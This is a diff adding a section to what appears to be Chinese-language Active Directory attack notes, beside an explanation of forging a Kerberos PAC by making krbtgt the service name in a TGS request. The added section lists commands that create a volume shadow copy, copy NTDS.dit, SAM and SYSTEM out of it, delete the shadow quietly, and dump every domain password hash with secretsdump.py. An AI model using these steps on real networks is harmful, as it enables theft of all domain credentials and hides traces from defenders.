@@ -62,3 +62,13 @@ PAC结构：https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac
 
 注意一：PAC是放置在`KRB_AS_REP::Ticket::AuthorizationData`字段中的，而`KRB_AS_REP::Ticket`字段是经过krbtgt哈希加密的，我们没有krbtgt哈希，构造出的PAC按理说无法填充到被krbtgt加密的Ticket的AuthorizationData字段中，但是很巧妙可以利用`KRB_TGS_REP`消息的生成的逻辑构造出来。`KRB_TGS_REP::Ticket::EncryptedData`的生成会把`KRB_TGS_REQ::enc-authorization-data`填充进去，`KRB_TGS_REQ::enc-authorization-data`是我们客户端可控的，而`KRB_TGS_REP::Ticket`是用服务账户的哈希进行加密的，所以我们需要把`KRB_TGS_REQ::sname`设置为krbtgt账户，这样我们就可以把构造好的PAC填充到被krbtgt加密的Ticket的AuthorizationData字段中了。
 
+## 0x10 NTDS.DIT && sam
+每个域控都存在NTDS.DIT文件，该文件存储着域内所有用户的哈希，而每台计算机又有一个sam文件存储本地计算机所有用户的哈希。
+卷影拷贝提取文件：
+```
+vssadmin create shadow /for=C: #创建卷影
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS #提取NTDS.dit文件
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\SAM #提取SAM文件
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM #提取SYSTEM文件
+vssadmin Delete Shadows /For=C: /quiet #删除卷影
+python3 secretsdump.py -ntds NTDS -system SYSTEM LOCAL #提取NTDS.DIT中的哈希
